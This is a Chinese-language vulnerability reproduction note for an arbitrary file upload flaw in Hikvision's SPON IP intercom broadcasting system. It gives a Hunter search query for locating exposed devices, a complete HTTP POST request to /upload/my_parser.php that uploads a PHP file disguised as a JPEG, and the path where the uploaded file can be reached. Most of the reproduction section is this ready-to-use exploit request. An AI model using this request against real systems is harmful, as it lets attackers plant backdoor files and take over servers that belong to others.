# 海康威视SPON IP网络对讲广播系统my_parser存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统my_parser存在任意文件上传漏洞，恶意攻击者可能会上传恶意的后门文件，使服务器失陷。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征

![1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b.png](./img/eeomSk6Be4UoNr4r/1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b-443930.png)

# 四、漏洞复现
```java
/upload/upload.html
```

![1704857171496-32b9c84a-3439-4941-90e7-dc4b2f2264e6.png](./img/eeomSk6Be4UoNr4r/1704857171496-32b9c84a-3439-4941-90e7-dc4b2f2264e6-022312.png)

```java
POST /upload/my_parser.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8dsf2vRYZDVPaW9m
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 139243

------WebKitFormBoundary8dsf2vRYZDVPaW9m
Content-Disposition: form-data; name="upload"; filename="tt.php"
Content-Type: image/jpeg

1111111
------WebKitFormBoundary8dsf2vRYZDVPaW9m--
```

![1704857288482-ca32fb5c-937a-4ecf-b86c-91a298e5a38a.png](./img/eeomSk6Be4UoNr4r/1704857288482-ca32fb5c-937a-4ecf-b86c-91a298e5a38a-336677.png)

上传文件位置

```java
/upload/files/tt.php
```

![1704857320066-c828b2fe-fc1c-4f32-a9b1-3ae9e5d73100.png](./img/eeomSk6Be4UoNr4r/1704857320066-c828b2fe-fc1c-4f32-a9b1-3ae9e5d73100-761362.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dgm1h4giy6i2k3ys>